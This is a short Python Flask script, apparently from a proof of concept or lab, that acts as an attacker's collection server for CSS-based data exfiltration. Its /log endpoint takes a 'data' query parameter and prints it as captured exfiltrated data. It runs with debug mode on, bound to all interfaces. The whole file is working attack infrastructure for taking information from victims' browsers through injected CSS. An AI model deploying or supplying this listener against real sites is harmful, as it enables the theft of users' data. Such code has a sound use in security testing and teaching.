from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['GET'])
def log_data():
    """Capture exfiltrated data sent via external CSS requests."""
    exfiltrated_data = request.args.get('data', 'No data')
    print(f"\n[+] EXFILTRATED DATA CAPTURED: {exfiltrated_data}\n")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
